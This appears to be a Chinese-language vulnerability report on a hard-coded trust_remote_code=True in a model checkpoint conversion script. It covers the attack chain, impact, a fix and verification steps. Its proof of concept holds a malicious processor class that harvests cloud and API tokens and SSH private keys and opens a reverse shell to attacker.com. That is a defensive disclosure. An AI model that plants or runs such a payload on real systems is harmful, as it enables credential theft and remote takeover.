# checkpoint-vuln-006: Improper Neutralization of Directives - `merge_dcp_to_hf`

**严重性**: High | **CWE**: CWE-95 | **置信度**: 85/100
**位置**: `checkpoint/common/merge_dcp_to_hf.py:94` @ `merge_dcp_to_hf`

---

## 1. 漏洞细节

本漏洞位于 DCP checkpoint 转换函数 `merge_dcp_to_hf` 中，该函数在加载 HuggingFace Processor 时硬编码 `trust_remote_code=True` 参数。

当 `trust_remote_code=True` 时，`AutoProcessor.from_pretrained` 会自动下载并执行模型仓库中的自定义 processor 代码文件。攻击者可以通过向模型仓库上传包含恶意 payload 的 processor 代码文件，诱导用户进行 DCP 到 HF 格式的转换，从而在用户系统上执行任意代码。

### 漏洞成因

1. `trust_remote_code=True` 在代码中硬编码，用户无法控制
2. `model_assets_dir` 参数来自 CLI，可能指向恶意模型仓库
3. 该函数是模型格式转换流程的核心函数，常被用户使用

---

## 2. 漏洞代码

**文件**: `checkpoint/common/merge_dcp_to_hf.py` (行 82-106)

```python
@validate_arguments
def merge_dcp_to_hf(
    load_dir: DirectoryPath,
    save_dir: str | Path,
    model_assets_dir: DirectoryPath,
    prefix: str = "",
):
    """
    Load model in torch DCP format and save in Hugging Face format.
    """
    state_dict = load_dcp_state_dict(load_dir)

    config = AutoConfig.from_pretrained(str(model_assets_dir))
    processor = AutoProcessor.from_pretrained(str(model_assets_dir), trust_remote_code=True)  # <-- 漏洞点：硬编码 True
    
    save_path = Path(save_dir)
    config.save_pretrained(save_path)
    processor.save_pretrained(save_path)

    save_hf_weights(
        save_path=save_path,
        model_assets_dir=str(model_assets_dir),
        state_dict=state_dict,
        prefix=prefix,
    )
```

### 代码分析

- **行 93**: `AutoConfig.from_pretrained(str(model_assets_dir))` 加载配置
- **行 94**: `AutoProcessor.from_pretrained(str(model_assets_dir), trust_remote_code=True)` **硬编码启用远程代码执行**
- **行 160**: `model_assets_dir` 来自 CLI 参数 `--model-assets-dir`
- **行 120-121**: `merge_dcp_to_hf_sharded` 函数同样存在此漏洞（`trust_remote_code` 参数默认为 `True`）

---

## 3. 完整攻击链路

```
[入口点] CLI --model-assets-dir 参数
↓ 用户指定恶意模型仓库目录路径
[中间步骤1] argparse 解析 CLI 参数 @ merge_dcp_to_hf.py:164
↓ args.model_assets_dir 包含恶意目录路径
[中间步骤2] merge_dcp_to_hf(...) @ merge_dcp_to_hf.py:179
↓ model_assets_dir 传递到函数
[漏洞触发] AutoProcessor.from_pretrained(model_assets_dir, trust_remote_code=True) @ merge_dcp_to_hf.py:94
↓ transformers 执行恶意 processor 代码
```

### 攻击链路说明

1. **入口点**: 用户通过 CLI 指定 `--model-assets-dir` 参数，指向恶意模型目录
2. **参数传递**: CLI 参数被解析并传递给 `merge_dcp_to_hf` 函数
3. **硬编码风险**: 函数内部硬编码 `trust_remote_code=True`，无法禁用
4. **代码执行**: `AutoProcessor.from_pretrained` 自动加载并执行恶意 processor 代码

---

## 4. 攻击场景

**攻击者画像**: 提供恶意模型仓库的第三方、供应链攻击者、内部威胁
**攻击向量**: 通过共享模型仓库目录传播恶意 processor 代码
**利用难度**: 低

### 攻击步骤

1. **构造恶意模型仓库**: 攻击者创建包含恶意 `processing_*.py` 文件的模型目录
2. **传播恶意目录**: 通过模型共享平台、内部文件共享、Git 仓库等方式传播
3. **诱导用户转换**: 用户使用 `merge_dcp_to_hf.py` 脚本进行模型格式转换
4. **触发漏洞**: `AutoProcessor.from_pretrained` 加载并执行恶意代码

---

## 5. 攻击条件

| 条件类型   | 要求                    | 说明                                               |
| ---------- | ----------------------- | -------------------------------------------------- |
| 网络可达性 | 无需网络                | 攻击文件可通过本地目录提供                         |
| 认证要求   | 无需认证                | 只需能访问恶意 model_assets_dir                    |
| 配置依赖   | 无额外配置              | trust_remote_code=True 硬编码，用户无法禁用        |
| 环境依赖   | transformers 库         | 需要安装 HuggingFace transformers 库              |

---

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                   |
| -------- | ---- | ------------------------------------------------------ |
| 机密性   | 高   | 恶意代码可读取系统文件、窃取 SSH 密钥、获取环境变量   |
| 完整性   | 高   | 恶意代码可修改 checkpoint 文件、篡改模型权重          |
| 可用性   | 高   | 恶意代码可删除文件、破坏系统                           |

**影响范围**: 
- 执行模型转换的工作节点
- 所有使用该模型仓库的用户

---

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### 构造恶意 processor 代码

```python
# processing_malicious.py (放置在恶意 model_assets_dir 中)
import os
import subprocess

class MaliciousProcessor:
    def __init__(self, **kwargs):
        # 漏洞触发时执行的恶意代码
        # 窃取敏感信息
        secrets_file = "/tmp/.secrets_stolen"
        with open(secrets_file, 'w') as f:
            # 环境变量
            for key in ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'HF_TOKEN', 'OPENAI_API_KEY']:
                f.write(f"{key}={os.environ.get(key, 'NOT_SET')}\n")
            # SSH 密钥
            ssh_key = os.path.expanduser('~/.ssh/id_rsa')
            if os.path.exists(ssh_key):
                with open(ssh_key) as sk:
                    f.write(f"\nSSH_KEY:\n{sk.read()}")
        
        # 反向 shell
        subprocess.Popen([
            '/bin/bash', '-c',
            'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
        ])
    
    def save_pretrained(self, save_dir):
        pass

# 创建 tokenizer_config.json 指向恶意 processor
```

### 配置文件设置

```json
// tokenizer_config.json (恶意 model_assets_dir 中)
{
    "auto_map": {
        "AutoProcessor": "processing_malicious.MaliciousProcessor"
    },
    "processor_class": "MaliciousProcessor"
}
```

### 触发漏洞的命令

```bash
# 用户运行模型转换命令
python checkpoint/common/merge_dcp_to_hf.py \
    --load-dir ./dcp_checkpoint \
    --save-dir ./hf_output \
    --model-assets-dir ./malicious_model_dir
```

**使用说明**: 
1. 攻击者准备包含恶意 processor 代码的模型目录
2. 用户运行 DCP 到 HF 转换脚本
3. `AutoProcessor.from_pretrained` 执行恶意代码

**预期结果**: 
- `/tmp/.secrets_stolen` 文件包含窃取的敏感信息
- 反向 shell 连接到攻击者服务器

---

## 8. 验证环境搭建

### 基础环境

- 操作系统: Ubuntu 22.04 / CentOS 8
- Python: 3.10+
- transformers: 4.40.0+
- MindSpeed-MM: 当前版本

### 构建步骤

```bash
# 安装依赖
pip install transformers torch safetensors

# 创建测试环境
mkdir -p test_malicious_model
```

### 创建测试恶意 processor

```python
# test_processing.py
import os

class TestProcessor:
    def __init__(self, **kwargs):
        # 测试 payload
        os.system('echo "VULN_CHECKPOINT_006_CONFIRMED" > /tmp/checkpoint_vuln_006_marker')
    
    def save_pretrained(self, save_dir):
        pass

# tokenizer_config.json
import json
config = {
    "auto_map": {
        "AutoProcessor": "test_processing.TestProcessor"
    }
}
with open('test_malicious_model/tokenizer_config.json', 'w') as f:
    json.dump(config, f)

# 复制 processor 文件
# test_processing.py 需要在 test_malicious_model 目录中
```

### 运行配置

```bash
# 检查测试标记不存在
ls /tmp/checkpoint_vuln_006_marker  # 应不存在

# 执行漏洞触发（简化测试）
python -c "
from transformers import AutoProcessor
# 模拟漏洞触发
processor = AutoProcessor.from_pretrained('./test_malicious_model', trust_remote_code=True)
print('Processor loaded')
"
```

### 验证步骤

1. 创建包含测试 payload 的恶意模型目录
2. 使用 `AutoProcessor.from_pretrained` 加载（模拟漏洞触发）
3. 检查 `/tmp/checkpoint_vuln_006_marker` 文件是否被创建

### 预期结果

- 文件 `/tmp/checkpoint_vuln_006_marker` 存在
- 内容为 "VULN_CHECKPOINT_006_CONFIRMED"

---

## 9. 修复建议

### 立即修复

```python
# 安全版本 - 让用户控制 trust_remote_code
def merge_dcp_to_hf(
    load_dir: DirectoryPath,
    save_dir: str | Path,
    model_assets_dir: DirectoryPath,
    prefix: str = "",
    trust_remote_code: bool = False,  # 添加参数，默认 False
):
    state_dict = load_dcp_state_dict(load_dir)

    config = AutoConfig.from_pretrained(str(model_assets_dir))
    processor = AutoProcessor.from_pretrained(
        str(model_assets_dir), 
        trust_remote_code=trust_remote_code  # 使用参数而非硬编码
    )
    
    # ... rest of code
```

### CLI 参数修改

```python
# merge_dcp_to_hf.py CLI 部分
parser.add_argument(
    "--trust-remote-code", 
    type=bool, 
    default=False,
    help="Whether to trust remote code when loading processor"
)
```